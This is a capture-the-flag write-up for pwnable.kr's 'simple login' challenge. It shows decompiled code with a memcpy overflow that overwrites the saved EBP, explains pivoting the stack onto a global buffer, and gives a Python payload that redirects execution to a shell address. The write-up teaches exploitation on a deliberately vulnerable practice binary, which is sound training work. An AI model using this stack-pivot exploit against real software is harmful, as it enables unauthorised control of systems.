# pwnable.kr -- Rookiss -- simple login
Like the flag says, control EBP, control EIP, then you are the Lord.

## 1. Challenge
  > Can you get authentication from this server?  
  >   
  > Download : http://pwnable.kr/bin/login  
  >   
  > Running at : nc pwnable.kr 9003  

## 2. Solution
  * Download binary file and open it in IDA.

  * In function `auth`, `memcpy` copy your input to a wrong place with 12 bytes at most. Open stack view and we can see that the last 4 bytes can overwrite previous EBP. So if we overwrite previous EBP, when `main` return, we can control EIP.

    ```cpp
    _BOOL4 __cdecl auth(int a1)
    {
      char v2; // [esp+14h] [ebp-14h]
      char *s2; // [esp+1Ch] [ebp-Ch]
      char v4[8]; // [esp+20h] [ebp-8h]

      memcpy(v4, input, a1);
      s2 = (char *)calc_md5((int)&v2, 12);
      printf("hash : %s\n", s2);
      return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
    }
    ```

  * But where do we control previous EBP to? Well, set previous EBP to the address of global variable `input`. When `main` return, the first 4 bytes of `input` will be poped to register `EBP` and the second 4 bytes of `input` will be poped to register `EIP`.

  * So the first 4 bytes of `input` can be set to whatever you want, but the second 4 bytes of `input` must be set to the address that can help me get shell. Obviously it is `0x08049284`.

    ```python
    input_addr = 0x0811EB40
    shell_entry = 0x08049284
    payload = b'fuck' + pack(shell_entry, 32) + pack(input_addr, 32)
    ```

  * Encode payload with Base64, send it and you will get shell.
